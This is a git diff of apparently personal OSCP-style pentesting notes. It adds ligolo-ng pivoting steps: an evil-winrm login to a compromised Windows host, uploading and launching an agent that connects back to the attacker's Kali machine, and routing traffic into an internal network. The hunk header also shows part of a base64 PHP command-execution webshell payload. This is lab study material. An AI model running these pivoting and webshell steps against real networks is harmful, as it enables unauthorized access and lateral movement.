@@ -1058,12 +1058,62 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
      - https://github.com/nicocha30/ligolo-ng/releases
      - [ligolo-ng_agent_0.8.1_windows_amd64.zip](https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.1/ligolo-ng_agent_0.8.1_windows_amd64.zip)
      - After extracted, 3 files:agent.exe, License, readme.md
-  5. Connect to compromised agent - MS01
-  6. dddd
-  7. dd
-- ddd
-- ddd
-- ddd
+  5. Connect to compromised server (agent) - MS01
+     `evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>'`
+  6. Transfer the agent.exe to compromised agent - MS01
+     `upload /home/kali/offsec/ligolo/agent.exe C:/Users/eric.wallows/Documents/agent.exe`  
+  8. Setup proxy in kali > Create a new TUN interface ligolo and bring it up  
+     ```
+     sudo ip tuntap add user <Your Username-kali> mode tun ligolo
+     sudo ip link set ligolo up
+     ```
+  9. Start the ligolo-proxy with selfcert option
+     `ligolo-proxy -selfcert`
+  10. Start the agent in compromised server (agent) - MS01
+      `.\agent.exe -connect <kali>:11601 -ignore-cert`
+  11. Agent joined. Back to ligolo terminal
+  12. Set up tunnel and configure the route to establish a connection
+      ```
+      ligolo-ng » session
+      
+      ? Specify a session : 1 - OSCP\eric.wallows@MS01 - 192.168.196.141:53221 - 005056ab5090
+      [Agent : OSCP\eric.wallows@MS01] » ifconfig
+      ┌───────────────────────────────────────────────┐
+      │ Interface 0                                   │
+      ├──────────────┬────────────────────────────────┤
+      │ Name         │ Ethernet0                      │
+      │ Hardware MAC │ 00:50:56:ab:50:90              │
+      │ MTU          │ 1500                           │
+      │ Flags        │ up|broadcast|multicast|running │
+      │ IPv4 Address │ 192.168.196.141/24             │
+      └──────────────┴────────────────────────────────┘
+      ┌───────────────────────────────────────────────┐
+      │ Interface 1                                   │
+      ├──────────────┬────────────────────────────────┤
+      │ Name         │ Ethernet1                      │
+      │ Hardware MAC │ 00:50:56:ab:8f:98              │
+      │ MTU          │ 1500                           │
+      │ Flags        │ up|broadcast|multicast|running │
+      │ IPv4 Address │ 10.10.156.141/24               │
+      └──────────────┴────────────────────────────────┘
+      ┌──────────────────────────────────────────────┐
+      │ Interface 2                                  │
+      ├──────────────┬───────────────────────────────┤
+      │ Name         │ Loopback Pseudo-Interface 1   │
+      │ Hardware MAC │                               │
+      │ MTU          │ -1                            │
+      │ Flags        │ up|loopback|multicast|running │
+      │ IPv6 Address │ ::1/128                       │
+      │ IPv4 Address │ 127.0.0.1/8                   │
+      └──────────────┴───────────────────────────────┘
+      ```
+- MS01 can access the internal 10.10.156.141/24 network
+- From **kali** terminal: Add a route for Ligolo to route traffic through the tunnel and reach the target network
+  `sudo ip route add <Internal_Network> dev ligolo`
+  E.g `sudo ip route add 10.10.156.0/24 dev ligolo`
+- Back to **Ligolo** terminal: start the tunnel and go the jump box
+  `[Agent : OSCP\eric.wallows@MS01] » start`
+- You can nmap
 
 # Top tools and command  
 1. **hashcat**: Cracking NTLM / Kerberos hashes  
